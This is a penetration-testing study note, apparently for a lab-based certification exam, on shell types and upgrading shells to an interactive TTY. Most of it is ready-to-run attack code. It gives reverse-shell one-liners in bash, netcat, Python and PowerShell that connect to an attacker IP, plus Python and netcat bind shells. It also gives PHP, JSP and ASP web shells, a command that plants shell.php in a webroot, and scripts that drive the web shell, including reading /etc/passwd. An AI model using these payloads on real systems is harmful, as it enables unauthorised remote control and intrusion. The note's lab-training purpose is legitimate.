---
id: gs-105
module: Getting Started
kind: note
title: "Shell Types & Upgrade to Interactive TTY"
description: "Reverse shell, Bind shell, Web shell; command syntax by OS; TTY upgrade for stability; persistence options."
tags: [reverse-shell, bind-shell, web-shell, netcat, php, bash, powershell, tty-upgrade, pty]
---

# Shell Types & Interactive Access

## Three Main Shell Types

| Type | Setup | Pros | Cons |
|------|-------|------|------|
| **Reverse** | Attacker listens; target connects back | Fastest initial access | Fragile (lose connection → restart exploit) |
| **Bind** | Target listens on port; attacker connects | More stable than reverse | Requires open port on target (may be blocked) |
| **Web** | PHP/JSP on webroot; access via HTTP | Firewall bypass, persistent (survives reboot) | Slower (HTTP request per command) |

**Exam strategy:** Reverse shell for initial foothold (speed); upgrade to bind/web shell for stability.

---

## Reverse Shell Setup

### On Attacker Machine (Listener)

```bash
nc -lvnp $LPORT
# -l = listen, -v = verbose, -n = no DNS, -p = port
# Wait for incoming connection
```

### On Target Machine (Execute One of These)

**Linux / Bash (Most Reliable):**
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'
```

**Linux / Bash Alt (If above fails):**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f
```

**Linux / Python:**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Windows / PowerShell:**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.2',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

**Key variables to replace:**
- `10.10.14.2` = Attacker IP (from `ip a` on tun0 adapter)
- `4444` = Attacker port (any unused port > 1024)

---

## Bind Shell Setup

### On Target Machine (Execute)

**Bash Bind Shell:**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

**Python Bind Shell:**
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

### On Attacker Machine (Connect)

```bash
nc $TARGET_IP 1234
# Now you have shell
```

**Advantage:** If connection drops, port still listens; reconnect immediately without re-exploiting.

---

## Web Shell Setup

### Write to Webroot (Execute via RCE or File Upload)

**PHP (Most Common):**
```php
<?php system($_REQUEST["cmd"]); ?>
```
→ Save as `shell.php` in webroot (e.g., `/var/www/html/`)

**JSP (Java):**
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**ASP.NET (Windows):**
```asp
<% eval request("cmd") %>
```

### Find Webroot Path (Target-Dependent)

| Web Server | Default Webroot |
|------------|-----------------|
| Apache (Linux) | `/var/www/html/` |
| Nginx (Linux) | `/usr/local/nginx/html/` or `/var/www/html/` |
| IIS (Windows) | `c:\inetpub\wwwroot\` |
| XAMPP (Windows) | `C:\xampp\htdocs\` |
| Tomcat (Linux) | `/var/lib/tomcat/webapps/ROOT/` |

**Quick check if RCE achieved:**
```bash
# On target shell:
ls /var/www/html/
# If empty or writable, write shell there
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

### Execute Commands via Web Shell

**Browser:**
```
http://$TARGET_IP/shell.php?cmd=id
http://$TARGET_IP/shell.php?cmd=whoami
http://$TARGET_IP/shell.php?cmd=cat%20/etc/passwd
```

**Curl:**
```bash
curl "http://$TARGET_IP/shell.php?cmd=id"
curl "http://$TARGET_IP/shell.php?cmd=sudo%20-l"
```

**URL encoding tips:**
- Space = `%20`
- Pipe (`|`) = `%7c`
- Semicolon (`;`) = `%3b`
- `&` = `%26`

---

## Upgrade to Full Interactive TTY

**Problem:** Reverse/bind shells don't have proper terminal (can't use Ctrl+C, tab-complete, history, arrow keys).

**Solution: Python PTY Upgrade**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# or if python3 not available:
python -c 'import pty;pty.spawn("/bin/bash")'
```

**Then background shell and fix terminal settings:**

```bash
# In shell, press Ctrl+Z to background it
[1] Stopped
$ stty raw -echo
$ fg
# (may show blank line; press Enter)
$ export TERM=xterm
$ stty rows 50 columns 200  # match your terminal size
```

**Get terminal size from your machine:**
```bash
# In new terminal on attacker:
echo $TERM
stty size
```

**Result:** Now you have full interactive shell with history, line editing, etc.

---

## Web Shell Automation (for Non-Interactive)

If web shell is your only option and you need multi-command workflow:

```bash
#!/bin/bash
TARGET="http://$TARGET_IP/shell.php"
cmd="$1"
curl "${TARGET}?cmd=$(echo -n "$cmd" | jq -sRr @uri)"
```

Save as `shell.sh`, then: `./shell.sh "whoami"`, `./shell.sh "sudo -l"`, etc.

Or use interactive wrapper:
```python
import requests
import sys

url = "http://10.129.1.1/shell.php"
while True:
    cmd = input("$ ")
    r = requests.get(url, params={"cmd": cmd})
    print(r.text)
```

---

## Shell Stability Hierarchy

**Most Stable → Least Stable:**
1. SSH login (requires creds, but native terminal)
2. Bind shell (persistent port, reconnectable)
3. Reverse shell (interactive, but fragile)
4. Web shell (survives reboot, slow interaction)

**On exam:** Prioritize reverse shell for speed; upgrade to bind/web for stability if connection is unstable.

---

## Common Shell Failures & Fixes

| Problem | Cause | Fix |
|---------|-------|-----|
| Reverse shell doesn't connect | Firewall blocks outbound traffic | Use bind shell or web shell |
| Bash reverse shell returns blank | `bash -i` not working; target may not have bash | Use `/bin/sh` or try Python |
| Python reverse shell fails | Import error (socket/subprocess missing) | Use bash or perl alternative |
| Web shell returns blank | PHP executed but output not returned | Check `error_log` in webroot; may be syntax error |
| Ctrl+C kills shell | Not in raw TTY mode | Use Python pty trick, then `stty raw -echo` |
| Can't type after Ctrl+Z | Terminal settings wrong | Run `stty raw -echo; fg` again |

---

## Related Notes

[[../shells-payloads/]] — Detailed shell syntax for edge cases, encoding tricks  
[[06-public-exploits]] — Payload delivery via Metasploit (handles shell setup automatically)
